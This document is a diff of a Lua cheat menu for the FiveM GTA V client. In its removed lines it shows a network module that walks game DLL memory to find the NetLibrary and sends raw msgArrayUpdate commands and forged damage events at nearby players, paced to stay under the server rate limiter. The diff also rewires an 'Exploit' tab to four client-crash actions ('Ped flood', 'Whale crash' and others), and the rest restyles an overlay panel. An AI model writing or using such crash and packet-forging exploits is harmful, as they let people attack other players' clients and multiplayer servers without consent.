@@ -16583,7 +16583,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-28 13:34:49
+-- Generated: 2026-10-28 13:42:57
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -21140,358 +21140,6 @@ end
 return FL
 
 end)(O,Menu)
-
--- ---------------------------------------------------------------------------
--- PART: 28_net_link.lua
--- ---------------------------------------------------------------------------
--- Network lane. Two independent paths, both below the Lua event layer:
---
---   Net array   The client's own NetLibrary sends the engine's msgArrayUpdate
---               reliable command with a short element body. The server's C++
---               array handler stores and relays it; no resource event, no
---               entity, no state bag, no native hook. Current server builds
---               rate-limit the handler (75/s sustained, 125 burst), so the
---               loop sends one command per game frame, never a burst.
---
---   Net damage  Susano.SendNetworkDamage with a zero-damage run-over record
---               from the local on-foot ped. parentGlobalId is zero; the
---               receiving clients process the damage event through the same
---               engine path as the public b3258 report.
---
--- The NetLibrary instance is located by walking the .data section of
--- gta-net-five.dll for a pointer whose head is the exported NetLibrary vtable.
--- Every candidate is bounds-checked with Memory.Valid, the vtable slots for
--- SendReliableCommand and GetConnectionState are verified, and the connection
--- state is read directly at +0x48 (GetConnectionState is a one-instruction
--- getter). Any mismatch aborts before a single packet is built.
--- ---------------------------------------------------------------------------
-local NET = (function(O)
-    local NET = {}
-
-    NET.sendFn = nil
-    NET.stateFn = nil
-    NET.vtable = nil
-    NET.instance = nil
-    NET.typeBuf = nil
-    NET.dataBuf = nil
-    NET.busy = false
-    NET.lastDamage = 0
-
-    local valid = Susano.Memory.Valid
-
-    local function is_valid(addr)
-        if type(addr) ~= "number" then return false end
-        if type(valid) ~= "function" then return true end
-        local ok, res = pcall(valid, addr)
-        return ok and res == true
-    end
-
-    local function read_u32(addr)
-        if not is_valid(addr) or not is_valid(addr + 3) then return nil end
-        local ok, v = pcall(Susano.Memory.ReadU32, addr)
-        if ok and type(v) == "number" then return v end
-        return nil
-    end
-
-    local function read_u64(addr)
-        if not is_valid(addr) or not is_valid(addr + 7) then return nil end
-        local ok, v = pcall(Susano.Memory.ReadU64, addr)
-        if ok and type(v) == "number" then return v end
-        return nil
-    end
-
-    local function bytes_of(s)
-        local t = {}
-        for i = 1, #s do t[i] = string.byte(s, i) end
-        t[#s + 1] = 0
-        return t
-    end
-
-    local function read_name(addr)
-        local ok, b = pcall(Susano.Memory.ReadBytes, addr, 8)
-        if not ok or type(b) ~= "table" then return "" end
-        local out = {}
-        for i = 1, #b do
-            local c = b[i]
-            if c == 0 then break end
-            out[#out + 1] = string.char(c)
-        end
-        return table.concat(out)
-    end
-
-    -- The two virtual slots we depend on. If the resolved vtable does not
-    -- point at the exported functions, the export walk returned something
-    -- else and the lane refuses to run.
-    local function vtable_ok(vt)
-        if type(vt) ~= "number" or type(NET.sendFn) ~= "number"
-            or type(NET.stateFn) ~= "number" then
-            return false
-        end
-        local sendSlot = read_u64(vt + 0x58)
-        local stateSlot = read_u64(vt + 0x88)
-        return sendSlot == NET.sendFn and stateSlot == NET.stateFn
-    end
-
-    -- GetConnectionState is `mov eax, [rcx+0x48]; ret`. Reading the field
-    -- directly removes the only indirect call made on a scanned pointer.
-    local function state_ok(obj)
-        return read_u32(obj + 0x48) == 8
-    end
-
-    local function scan_range(addr, size)
-        local step = 0x1000
-        local off = 0
-        while off < size do
-            local n = math.min(step, size - off)
-            local ok, b = pcall(Susano.Memory.ReadBytes, addr + off, n)
-            if ok and type(b) == "table" and #b >= 8 then
-                local i = 1
-                while i <= #b - 7 do
-                    local hi = b[i + 4] + b[i + 5] * 256
-                        + b[i + 6] * 65536 + b[i + 7] * 16777216
-                    if hi ~= 0 and hi < 0x8000 then
-                        local v = read_u64(addr + off + i - 1)
-                        if v and v > 0x10000 and v < 0x7FFFFFFFFFFF
-                            and v % 8 == 0 then
-                            local head = read_u64(v)
-                            if head and head == NET.vtable and state_ok(v) then
-                                return v
-                            end
-                        end
-                    end
-                    i = i + 8
-                end
-            end
-            off = off + step
-        end
-        return nil
-    end
-
-    function NET.find_instance()
-        local base = Susano.Memory.Module("gta-net-five.dll")
-        if not base then return nil end
-
-        local e = read_u32(base + 0x3C)
-        if not e or e == 0 or e > 0x1000 then return nil end
-        local nsec = read_u32(base + e + 6)
-        local opt = read_u32(base + e + 20)
-        if not nsec or not opt then return nil end
-
-        local sec = base + e + 24 + opt
-        for i = 0, nsec - 1 do
-            local o = sec + i * 40
-            if read_name(o) == ".data" then
-                local vs = read_u32(o + 8)
-                local va = read_u32(o + 12)
-                if vs and va and vs > 0 and vs < 0x4000000 then
-                    local found = scan_range(base + va, vs)
-                    if found then return found end
-                end
-            end
-        end
-
-        local image_size = read_u32(base + e + 24 + 56)
-        if image_size and image_size > 0 and image_size < 0x4000000 then
-            return scan_range(base, image_size)
-        end
-        return nil
-    end
-
-    function NET.init()
-        if NET.ready then return true end
-        if type(Susano) ~= "table" or type(Susano.Memory) ~= "table" then
-            return false
-        end
-        if type(Susano.Memory.GetProc) ~= "function"
-            or type(Susano.Memory.Alloc) ~= "function"
-            or type(Susano.Memory.WriteBytes) ~= "function" then
-            return false
-        end
-
-        local okSend, sendFn = pcall(Susano.Memory.GetProc,
-            "net.dll", "?SendReliableCommand@NetLibrary@@UEAAXPEBD0_K@Z")
-        local okState, stateFn = pcall(Susano.Memory.GetProc,
-            "net.dll", "?GetConnectionState@NetLibrary@@UEAAHXZ")
-        local okVt, vtable = pcall(Susano.Memory.GetProc,
-            "net.dll", "??_7NetLibrary@@6BINetLibrary@@@")
-
-        if type(vtable) ~= "number" then
-            local netBase = Susano.Memory.Module("net.dll")
-            if type(netBase) == "number" and netBase > 0 then
-                vtable = netBase + 0x96A28
-            end
-        end
-
-        if not (okSend and okState) then
-            O.log("net: export walk failed")
-            return false
-        end
-        if type(sendFn) ~= "number" or type(stateFn) ~= "number"
-            or type(vtable) ~= "number" then
-            O.log("net: net.dll export missing")
-            return false
-        end
-
-        NET.sendFn = sendFn
-        NET.stateFn = stateFn
-        NET.vtable = vtable
-
-        if not vtable_ok(vtable) then
-            O.log("net: vtable slot mismatch")
-            return false
-        end
-
-        local okType, typeBuf = pcall(Susano.Memory.Alloc, 32, "rw")
-        local okData, dataBuf = pcall(Susano.Memory.Alloc, 640, "rw")
-        if not (okType and okData) or type(typeBuf) ~= "number"
-            or type(dataBuf) ~= "number" then
-            O.log("net: buffer allocation failed")
-            return false
-        end
-
-        NET.typeBuf = typeBuf
-        NET.dataBuf = dataBuf
-        Susano.Memory.WriteBytes(NET.typeBuf, bytes_of("msgArrayUpdate"))
-        NET.ready = true
-        return true
-    end
-
-    local function resolve_instance()
-        local cached = NET.instance
-        if cached and read_u64(cached) == NET.vtable and state_ok(cached) then
-            return cached
-        end
-        local found = NET.find_instance()
-        NET.instance = found
-        return found
-    end
-
-    function NET.send(netlib, array_index, elem, size, data)
-        if type(netlib) ~= "number" or netlib == 0 then return false end
-        if type(array_index) ~= "number" or type(elem) ~= "number" then
-            return false
-        end
-        if type(size) ~= "number" or size < 1 or size > 128 then
-            return false
-        end
-
-        local payload = {
-            array_index % 256,
-            elem % 256,
-            math.floor(elem / 256) % 256,
-            size % 256,
-            math.floor(size / 256) % 256,
-        }
-        for i = 1, size do
-            local b = data[i]
-            if type(b) ~= "number" then b = 0 end
-            payload[#payload + 1] = math.floor(b) % 256
-        end
-
-        if not Susano.Memory.WriteBytes(NET.dataBuf, payload) then
-            return false
-        end
-        local ok = pcall(Susano.Memory.Call, NET.sendFn, "v:pppl",
-            netlib, NET.typeBuf, NET.dataBuf, #payload)
-        return ok
-    end
-
-    function NET.purge(kind)
-        if NET.busy then return end
-        if not NET.init() then return end
-
-        local netlib = resolve_instance()
-        if not netlib then
-            O.log("net array: no active instance")
-            return
-        end
-
-        NET.busy = true
-        Citizen.CreateThread(function()
-            local ok, err = pcall(function()
-                local zeros = {}
-                for i = 1, 128 do zeros[i] = 0 end
-                local highs = {}
-                for i = 1, 128 do highs[i] = 255 end
-                local profiles = {
-                    { size = 16, data = zeros },
-                    { size = 128, data = highs },
-                }
-
-                for elem = 0, 49 do
-                    for p = 1, #profiles do
-                        NET.send(netlib, kind, elem, profiles[p].size,
-                            profiles[p].data)
-                        -- One command per game frame: keeps the outgoing
-                        -- reliable queue and the server rate limiter happy.
-                        Citizen.Wait(0)
-                    end
-                end
-            end)
-            NET.busy = false
-            if not ok then
-                O.log("net array: %s", tostring(err))
-            else
-                O.log("net array %d: complete", kind)
-            end
-        end)
-    end
-
-    local function nearest_ped()
-        local me = PlayerPedId()
-        local mec = GetEntityCoords(me)
-        local best, bestd = nil, nil
-        for _, player in ipairs(GetActivePlayers()) do
-            if player ~= PlayerId() then
-                local ped = GetPlayerPed(player)
-                if ped and ped ~= 0 and ped ~= me and DoesEntityExist(ped)
-                    and not IsPedDeadOrDying(ped, true) then
-                    local c = GetEntityCoords(ped)
-                    local dx, dy, dz = c.x - mec.x, c.y - mec.y, c.z - mec.z
-                    local d = math.sqrt(dx * dx + dy * dy + dz * dz)
-                    if d <= 300.0 and (not best or d < bestd) then
-                        best, bestd = ped, d
-                    end
-                end
-            end
-        end
-        return best
-    end
-
-    function NET.damage()
-        local target = C.target("ped")
-        local ped = target and target.ped or nearest_ped()
-        if not ped or ped == 0 or not DoesEntityExist(ped) then
-            O.log("net damage: no target")
-            return
-        end
-        if type(Susano.SendNetworkDamage) ~= "function" then
-            O.log("net damage: primitive unavailable")
-            return
-        end
-
-        local now = GetGameTimer()
-        if now - (NET.lastDamage or 0) < 1200 then return end
-        NET.lastDamage = now
-
-        local source = PlayerPedId()
-        if O.safe(IsPedInAnyVehicle, source, false) == true then
-            O.log("net damage: on foot only")
-            return
-        end
-
-        local coords = GetEntityCoords(ped)
-        local weapon = GetHashKey("weapon_run_over_by_car")
-        local ok, err = pcall(Susano.SendNetworkDamage,
-            source, ped, coords.x, coords.y, coords.z,
-            0.0, weapon, 522, 0, 0, 0, 0)
-        if not ok then
-            O.log("net damage: %s", tostring(err))
-        end
-    end
-
-    return NET
-end)(O)
 
 -- ---------------------------------------------------------------------------
 -- PART: 11_evasion.lua
@@ -28461,8 +28109,12 @@ local TP = (function(O,Menu)
 
 local TP = {}
 
-local BODY_R, BODY_G, BODY_B = 0.035, 0.039, 0.047
-local LABEL_R, LABEL_G, LABEL_B = 0.730, 0.745, 0.770
+-- Menu chrome: library.lua draws every menu card as a 1 px 0.216 grey border
+-- around a 0.059 anthracite body. The card reuses both values so it reads as
+-- the menu's right column instead of a second, darker window.
+local BORDER_R, BORDER_G, BORDER_B = 0.216, 0.216, 0.216
+local BODY_R, BODY_G, BODY_B = 0.059, 0.059, 0.059
+local LABEL_R, LABEL_G, LABEL_B = 0.760, 0.775, 0.800
 local VALUE_R, VALUE_G, VALUE_B = 1.000, 1.000, 1.000
 local HEAD_R, HEAD_G, HEAD_B = 0.970, 0.975, 0.985
 local WEAPON_R, WEAPON_G, WEAPON_B = 0.850, 0.665, 0.435
@@ -28470,24 +28122,25 @@ local TRACK_R, TRACK_G, TRACK_B = 0.155, 0.165, 0.180
 local HEALTH_R, HEALTH_G, HEALTH_B = 0.240, 0.860, 0.400
 local ARMOR_R, ARMOR_G, ARMOR_B = 0.360, 0.630, 0.960
 
--- The reference card is roughly two-thirds of the menu width. These bounds
--- keep that ratio at every scale without letting the card collapse below a
--- readable value column or grow into a second menu.
-local WIDTH_RATIO = 0.68
-local WIDTH_MIN = 238
-local WIDTH_MAX = 292
+-- The first pass copied the reference type scale too literally: 12.5 px rows
+-- are unreadable on a 1080p overlay. The row type now sits one full step below
+-- the menu's own 19 px items and the card widens slightly to keep the labels
+-- and values on one line. The layout is unchanged.
+local WIDTH_RATIO = 0.74
+local WIDTH_MIN = 258
+local WIDTH_MAX = 318
 
--- Logical sizes, multiplied by Menu.Scale on the way to the overlay. Row height
--- 19 and width ~245 reproduce the reference's ~1:1 card proportion.
-local PAD_X = 13
-local PAD_Y = 11
-local HEADER_HEIGHT = 30
-local ROW_HEIGHT = 19
-local FONT_HEADER = 13.5
-local FONT_ROW = 12.5
-local BAR_WIDTH = 4
-local BAR_HEIGHT = 12
-local BAR_GAP = 7
+-- Logical sizes, multiplied by Menu.Scale on the way to the overlay. At the
+-- default 110 % scale rows render at 24.2 px with 17.6 px type.
+local PAD_X = 14
+local PAD_Y = 12
+local HEADER_HEIGHT = 34
+local ROW_HEIGHT = 22
+local FONT_HEADER = 18
+local FONT_ROW = 16
+local BAR_WIDTH = 5
+local BAR_HEIGHT = 14
+local BAR_GAP = 8
 local RADIUS = 3
 
 local function clamp01(value)
@@ -28660,12 +28313,14 @@ function Menu.DrawPlayerInfoPanel()
     local panelWidth = math.max(WIDTH_MIN * scale,
         math.min(menuWidth * WIDTH_RATIO, WIDTH_MAX * scale))
 
-    -- Keep clear of the scrollbar if it is drawn outside the menu on the right.
+    -- The card hugs the menu: 8 logical px of air instead of the old 14, so
+    -- the dossier reads as the menu's right column. A right-side scrollbar is
+    -- the only thing that widens the gap, because it lives outside the frame.
     local scrollbarRight = tonumber(Menu.ScrollbarPosition) == 2
-    local edgeGap = (scrollbarRight and 26 or 14) * scale
+    local edgeGap = (scrollbarRight and 26 or 8) * scale
     local panelX = sp.x + menuWidth + edgeGap
     if panelX + panelWidth > screenWidth - 8 then
-        local leftGap = (not scrollbarRight and 26 or 14) * scale
+        local leftGap = (not scrollbarRight and 26 or 8) * scale
         local left = sp.x - leftGap - panelWidth
         if left >= 8 then
             panelX = left
@@ -28696,21 +28351,24 @@ function Menu.DrawPlayerInfoPanel()
         panelY = math.max(8, screenHeight - panelHeight - 8)
     end
 
-    -- Background. DrawShadowRect (documented) gives the soft offset edge of
-    -- the reference card; the plain fill is the fallback. Alpha stays below 1
-    -- so the card reads as an overlay rather than a hole in the game.
+    -- Background: the same two-layer chrome as library.lua's menu card, with
+    -- the soft offset shadow kept under the border. DrawShadowRect is the
+    -- documented primitive; the plain fill is the fallback. Alpha stays just
+    -- below 1 so the card reads as an overlay rather than a hole in the game.
     local radius = RADIUS * scale
     local shadowDrawn = false
     if Susano and type(Susano.DrawShadowRect) == "function" then
         shadowDrawn = pcall(Susano.DrawShadowRect,
             panelX, panelY, panelWidth, panelHeight,
-            BODY_R, BODY_G, BODY_B, 0.955,
+            BORDER_R, BORDER_G, BORDER_B, 0.98,
             3 * scale, 0.38, radius)
     end
     if not shadowDrawn then
         fillRect(panelX, panelY, panelWidth, panelHeight,
-            BODY_R, BODY_G, BODY_B, 0.955, radius)
+            BORDER_R, BORDER_G, BORDER_B, 0.98, radius)
     end
+    fillRect(panelX + 1, panelY + 1, panelWidth - 2, panelHeight - 2,
+        BODY_R, BODY_G, BODY_B, 0.98, radius)
 
     -- Header: the player name alone, centred, one line, no kicker and no
     -- badge. Truncation happens before centring so an ellipsised name still
@@ -30034,16 +29692,19 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (NETWORK ACTIONS)
+-- EXPLOIT > EXPLOIT (FOUR CRASH ACTIONS)
 --
--- Three independent network actions: `Net damage`, `Net array A` and
--- `Net array B`. Net damage sends a zero-damage run-over record through the
--- local NetLibrary; the two array rows send the engine's msgArrayUpdate
--- reliable command for handler 4 and handler 7 directly from the client's own
--- NetLibrary. No ped, object, task, event or state bag is created by either
--- path. The former ped/whale/emote/crush rows stay compiled but are not
--- exposed: the sweep below removes them from any older tab layout. The array
--- loop sends one command per game frame, under the server's 75/s limiter.
+-- Four independent actions: `Ped flood`, `Whale crash`, `Emote crash` and
+-- `Crush crash`. The first three call C.launch(kind); the fourth is the sink's
+-- slam/vehicle-explosion path with a respawn hold, built for the b3095
+-- +51DE0F window. There is no shared Method selector, no Intensity slider, no
+-- target row and no Launch/Stop row. One click selects one engine, one target
+-- window and one wire signature. The tab lives inside Exploit instead of a
+-- top-level category: fewer top-level rows, and the crash actions sit next to
+-- the other exploit actions. Any stale top-level Crasher category from an
+-- older loader is removed on every load. The tab itself is named "Exploit";
+-- "Crasher" is only the historical module name and the old tab label that is
+-- merged into it.
 -- ---------------------------------------------------------------------------
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
@@ -30051,7 +29712,6 @@ local CRASH_ROWS = {
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm",
     "Ped flood", "Whale crash", "Emote crash", "Crush crash",
-    "Net damage", "Net array A", "Net array B",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -30094,47 +29754,56 @@ local function installCrasher()
     for i = #tab.items, 1, -1 do
         local item = tab.items[i]
         if item.separatorText == "Crasher" or item.separatorText == "Crash"
-            or item.separatorText == "Exploit" or item.separatorText == "Net" then
+            or item.separatorText == "Exploit" then
             table.remove(tab.items, i)
         elseif isCrashRowName(item.name) then
             table.remove(tab.items, i)
         end
     end
 
-    -- Three direct actions. `Net damage` calls NET.damage(); the two array
-    -- rows call NET.purge(kind) with handler 4 and handler 7. Each row owns
-    -- exactly one wire signature. The old C/G engines stay built but get no
-    -- row, so a click never reaches a ped spawn, task burst or sink slam.
+    -- Four direct actions. The first three call C.launch(kind); the engine owns
+    -- the target window, spawn/task path and cleanup. The fourth calls
+    -- G.start("crash"), the sink's borrowed-world-vehicle slam with the
+    -- respawn hold. Nothing is shared between the vectors, so a click never
+    -- runs a mixed object/ped/emote loop.
     --
-    -- Prepend the block instead of appending it. The base Exploits tab also
-    -- carries the server rows (Staff Mode, Disable Weapon Damage, Menu Staff,
-    -- Revive); with ItemsPerPage = 8, the three net rows and their separator
-    -- stay on the first page and the server rows remain available underneath.
+    -- Prepend the crash block instead of appending it. The base Exploits tab
+    -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
+    -- Staff, Revive); with ItemsPerPage = 8, the four crash rows and their
+    -- separator stay on the first page and the server rows remain available
+    -- underneath.
     local crashItems = {
         {
             name = "",
             isSeparator = true,
-            separatorText = "Net",
+            separatorText = "Crash",
         },
         {
-            name = "Net damage",
+            name = "Ped flood",
             type = "action",
             onClick = function()
-                NET.damage()
+                C.launch("ped")
             end,
         },
         {
-            name = "Net array A",
+            name = "Whale crash",
             type = "action",
             onClick = function()
-                NET.purge(4)
+                C.launch("whale")
             end,
         },
         {
-            name = "Net array B",
+            name = "Emote crash",
             type = "action",
             onClick = function()
-                NET.purge(7)
+                C.launch("emote")
+            end,
+        },
+        {
+            name = "Crush crash",
+            type = "action",
+            onClick = function()
+                G.start("crash")
             end,
         },
     }
